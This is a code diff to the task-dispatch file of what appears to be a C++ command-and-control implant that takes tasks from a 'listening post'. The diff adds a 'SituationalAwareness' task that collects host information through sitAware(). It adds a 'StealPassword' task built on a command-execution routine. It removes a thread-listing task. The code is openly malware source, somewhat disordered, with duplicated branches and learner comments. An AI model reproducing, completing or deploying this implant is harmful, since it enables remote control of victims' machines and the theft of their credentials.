@@ -3,6 +3,9 @@
 #endif
 
 #include "tasks.h"
+#include "implant.h"
+#include "results.h"
+#include "configuration.h"
 
 #include <string>
 #include <array>
@@ -18,7 +21,7 @@
 
 
 // Function to parse the tasks from the property tree returned by the listening post
-// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
+// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the SituationalAwareness)
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
     std::function<void(const Configuration&)> setter) {
     // Get the task type and identifier, declare our variables
@@ -31,8 +34,8 @@
     // Conditionals to determine which task should be executed based on key provided
     // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
     // ===========================================================================================
-    if (taskType == PingTask::key) {
-        return PingTask{
+    if (taskType == SituationalAwareness::key) {
+        return SituationalAwareness{
             id
         };
     }
@@ -44,31 +47,13 @@
             std::move(setter)
         };
     }
-    if (taskType == ExecuteTask::key) {
-    return ExecuteTask{
-        id,
-        taskTree.get_child("command").get_value<std::string>()
-        };
-    }
-    if (taskType == ListThreadsTask::key) {
-    return ListThreadsTask{
-        id,
-        taskTree.get_child("procid").get_value<std::string>()
-        };
-    }
 
 //if you wanna pass any parameters to the task, we declare those parameters within the task code
 //ex: configure task
-    if (taskType == ExecuteTask::key) {
-        return ExecuteTask{
+    if (taskType == StealPassword::key) {
+        return StealPassword{
             id,
-            taskTree.get_child("command").get_value<std::string>()
-        };
-    }
-    if (taskType == ListThreadsTask::key) {
-        return ListThreadsTask{
-            id,
-            taskTree.get_child("procid").get_value<std::string>()
+            taskTree.get_child("steal").get_value<std::string>()
         };
     }
     // ===========================================================================================
@@ -84,14 +69,15 @@
 // Tasks
 // ===========================================================================================
 
-// PingTask
+// SituationalAwareness
 // -------------------------------------------------------------------------------------------
-PingTask::PingTask(const boost::uuids::uuid& id)
+SituationalAwareness::SituationalAwareness(const boost::uuids::uuid& id)
     : id{ id } {}
 
-Result PingTask::run() const {
-    const auto pingResult = "PONG!";
-    return Result{ id, pingResult, true };
+Result SituationalAwareness::run() const {
+    //returns the result of sitAware() from implant.cpp in the form of a Result object 
+    map<string, string> sitAwareResult = sitAware();
+    return Result{ id, sitAwareResult, true };
     //parameters: id, contents, bool if it was successful
 }
 
@@ -118,13 +104,13 @@ Result ConfigureTask::run() const {
 
 // ===========================================================================================
 
-// ExecuteTask
+// StealPassword
 // -------------------------------------------------------------------------------------------
-ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string command)
+StealPassword::StealPassword(const boost::uuids::uuid& id, std::string command)
     : id{ id },
     command{ std::move(command) } {} //what does move do
 
-Result ExecuteTask::run() const {
+Result StealPassword::run() const {
     std::string result;
     try {
         std::array<char, 128> buffer{};
@@ -145,68 +131,3 @@ Result ExecuteTask::run() const {
     }
 }
 
-// ListThreadsTask
-// ListThreadsTask
-// -------------------------------------------------------------------------------------------
-ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id, std::string processId)
-    : id{ id },
-    processId{ processId } {}
-
-Result ListThreadsTask::run() const {
-    try {
-        std::stringstream threadList;
-        auto ownerProcessId{ 0 };
-
-        // User wants to list threads in current process
-        if (processId == "-") {
-            ownerProcessId = GetCurrentProcessId();
-        }
-        // If the process ID is not blank, try to use it for listing the threads in the process
-        else if (processId != "") {
-            ownerProcessId = stoi(processId);
-        }
-        // Some invalid process ID was provided, throw an error
-        else {
-            return Result{ id, "Error! Failed to handle given process ID.", false };
-        }
-
-        HANDLE threadSnap = INVALID_HANDLE_VALUE;
-        THREADENTRY32 te32;
-
-        // Take a snapshot of all running threads
-        threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-        if (threadSnap == INVALID_HANDLE_VALUE)
-            return Result{ id, "Error! Could not take a snapshot of all running threads.", false };
-
-        // Fill in the size of the structure before using it. 
-        te32.dwSize = sizeof(THREADENTRY32);
-
-        // Retrieve information about the first thread,
-        // and exit if unsuccessful
-        if (!Thread32First(threadSnap, &te32))
-        {
-            CloseHandle(threadSnap);     // Must clean up the snapshot object!
-            return Result{ id, "Error! Could not retrieve information about first thread.", false };
-        }
-
-        // Now walk the thread list of the system,
-        // and display information about each thread
-        // associated with the specified process
-        do
-        {
-            if (te32.th32OwnerProcessID == ownerProcessId)
-            {
-                // Add all thread IDs to a string stream
-                threadList << "THREAD ID      = " << te32.th32ThreadID << "\n";
-            }
-        } while (Thread32Next(threadSnap, &te32));
-
-        //  Don't forget to clean up the snapshot object.
-        CloseHandle(threadSnap);
-        // Return string stream of thread IDs
-        return Result{ id, threadList.str(), true };
-    }
-    catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
-    }
-}
